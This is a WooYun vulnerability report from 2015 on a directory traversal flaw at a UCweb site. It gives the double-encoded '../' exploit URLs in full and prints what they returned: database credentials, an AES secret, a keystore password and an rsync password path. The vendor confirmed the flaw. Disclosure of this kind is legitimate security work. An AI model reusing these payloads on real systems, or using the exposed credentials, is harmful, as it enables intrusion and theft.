wybug_title: UCweb某站点目录遍历致敏感配置信息泄漏
wybug_detail:
漏洞详情 披露状态：   									2015-01-24：	细节已通知厂商并且等待厂商处理中									2015-01-26：	厂商已经确认，细节仅向厂商公开									2015-02-05：	细节向核心白帽子及相关领域专家公开									2015-02-15：	细节向普通白帽子公开									2015-02-25：	细节向实习白帽子公开									2015-03-10：	细节向公众公开  简要描述： UCweb某站点目录遍历，导致各种敏感配置信息泄漏 详细说明：  目录遍历位于：
http://mfw.uc.cn/download/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/home/jws/.bash_history
非root，可读取较大量的敏感配置信息。   漏洞证明：  比较有价值的用户：
jws:x:501:501::/home/jws:/bin/bash
.bash_history泄漏了很多信息：
/home/jws/local/logman/crontab/.rsync_passmhBds7ZtoxSJ
http://mfw.uc.cn/download/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//home/jws/apps/appserver/conf/db.conf
db.url=jdbc:mysql://127.0.0.1:23308/wifi?characterEncoding=utf-8db.driver=com.mysql.jdbc.Driverdb.user=wifidb.pass=H4RlesknKukp

device_db.url=jdbc:mysql://i3gt8888.mysql.rds.aliyuncs.com:3306/report_db?useUnicode=true&characterEncodeing=UTF-8device_db.driver=com.mysql.jdbc.Driverdevice_db.user=report_dbdevice_db.pass=report_db


http://mfw.uc.cn/download/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//home/jws/apps/appserver/conf/application.conf
# ~~~~~# AES文本加密密钥# 加密方式：jws.libs.encryptAES(str);# 解密方式：jws.libs.decryptAES(str);application.secret=wAh10yPZJZhs4zipuJjVDcGapGMpRLkOEbbOsbMu6VckNDYrJ6QcWey9NdIH6fOI#https相关https.port=8943keystore.algorithm=JKSkeystore.password=snk6QNgIQB15keystore.file=conf/https/ssl.jks
   修复方案：  修复目录遍历漏洞   版权声明：转载请注明来源 lijiejie@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-26 10:09 厂商回复： 漏洞存在，已转给相关人员处理，非常感谢！ 最新状态： 暂无
